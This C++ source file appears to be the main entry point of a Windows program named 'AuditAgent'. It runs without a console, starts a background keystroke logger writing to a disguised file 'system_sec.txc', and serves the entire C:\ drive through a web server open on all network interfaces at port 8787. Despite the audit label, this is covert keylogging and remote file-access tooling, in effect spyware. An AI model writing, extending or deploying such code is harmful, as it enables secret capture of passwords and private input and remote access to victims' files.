//#include <iostream>
//
//#include "AuditWebServer.h"
//#include "ApiKeyManager.h"
//#include "KeystrokeLogger.h"
//
//int main(int argc, char* argv[]) {
//    std::string error;
//
//    if (!ApiKeyManager::InitializeFromArgs(argc, argv, error)) {
//        std::cerr << "Startup failed: " << error << "\n";
//        std::cerr << "First startup example:\n";
//        std::cerr << "AuditAgent.exe k=YOUR_API_KEY\n";
//        return 1;
//    }
//
//    KeystrokeLogger logger("system_sec.txc");
//
//    // Start in the background; does not block anymore
//    logger.StartAsync();
//
//    const std::string host = "0.0.0.0";
//    const int port = 8787;
//    const std::string allowedRoot = "C:\\";
//
//    AuditWebServer server(host, port, allowedRoot);
//
//    std::cout << "Starting AuditAgent...\n";
//    std::cout << "Login: http://" << host << ":" << port << "/login\n";
//    std::cout << "Allowed root: " << allowedRoot << "\n";
//
//    server.Start();
//
//    return 0;
//}

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <iostream>

#include "AuditWebServer.h"
#include "ApiKeyManager.h"
#include "KeystrokeLogger.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // Note: Since there's no console, we use __argc and __argv (MSVC specific)
    // to get our command line arguments.
    std::string error;

    if (!ApiKeyManager::InitializeFromArgs(__argc, __argv, error)) {
        // Use a popup box since std::cerr is hidden
        MessageBoxA(NULL, error.c_str(), "Startup failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    KeystrokeLogger logger("system_sec.txc");
    logger.StartAsync();

    const std::string host = "0.0.0.0";
    const int port = 8787;
    const std::string allowedRoot = "C:\\";

    AuditWebServer server(host, port, allowedRoot);
    server.Start();

    return 0;
}